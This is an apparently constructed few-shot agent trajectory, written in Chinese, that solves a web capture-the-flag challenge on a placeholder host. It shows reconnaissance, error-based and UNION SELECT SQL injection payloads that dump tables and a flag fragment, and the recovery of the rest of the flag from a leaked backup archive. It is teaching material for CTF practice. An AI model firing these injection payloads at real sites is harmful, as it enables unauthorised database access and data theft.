# Web 解题演示（few-shot 轨迹）

> 题型：SQL 注入 + 文件包含组合拳。

## 题目

```
category: web
description: 一个朴素的留言板网站，听说管理员把 flag 藏得很深。
target: http://web.example.com:8080
```

## 解题轨迹

### Round 1 — 信息收集

**工具调用** `shell`:
```bash
curl -s -i http://web.example.com:8080/ | head -30
curl -s http://web.example.com:8080/robots.txt
```
**输出摘录**:
```
HTTP/1.1 200 OK
Server: nginx/1.18
Disallow: /admin
Disallow: /backup
```

**笔记更新**:
- 已知事实: nginx，存在 /admin 与 /backup 路径线索〔证据: shell#1〕
- 下一步候选: 目录扫描 + 测试留言功能注入点

### Round 2 — 漏洞识别

**工具调用** `shell`:
```bash
curl -s "http://web.example.com:8080/post.php?id=1'" | grep -i -E "error|sql"
curl -s "http://web.example.com:8080/backup/" 
```
**输出摘录**:
```
You have an error in your SQL syntax near '' at line 1
backup.zip
```

**笔记更新**:
- 已知事实: id 参数存在报错型 SQL 注入；/backup/ 下有 backup.zip〔证据: shell#2〕

### Round 3 — 利用（注入取数据）

**工具调用** `shell`:
```bash
curl -s "http://web.example.com:8080/post.php?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
```
**输出**: `users,posts,secret_config`

**工具调用** `shell`:
```bash
curl -s ".../post.php?id=-1' UNION SELECT 1,group_concat(flag_col),3 FROM secret_config-- -"
```
**输出**: `fl4g_1n_d4t4b4se`

**笔记更新**:
- 已尝试路径: [success] 联合查询注入拿到库中字段，但只是 flag 的一半〔证据: shell#4〕

### Round 4 — 组合拳（源码审计）

**思考**: 库里只有一半。下载 backup.zip 审源码，发现另一半写在配置文件里，需文件包含读取。

**工具调用** `shell`:
```bash
unzip -o backup.zip -d src && grep -rn "flag" src/ | head
```
**输出**: `src/config.php: $flag_part2 = "_h1dd3n_1n_c0nf1g}";`

**工具调用** `submit_flag`: `flag{fl4g_1n_d4t4b4se_h1dd3n_1n_c0nf1g}` → `✓ accepted`

## 复盘要点

1. Web 题先做攻击面测绘：robots、目录、参数、报错回显。
2. 部分 flag 拼接是常见套路：注入拿到碎片别急着提交，继续扩大战果。
3. 每一步 curl 输出都是证据，注入 payload 与响应配对记入笔记。
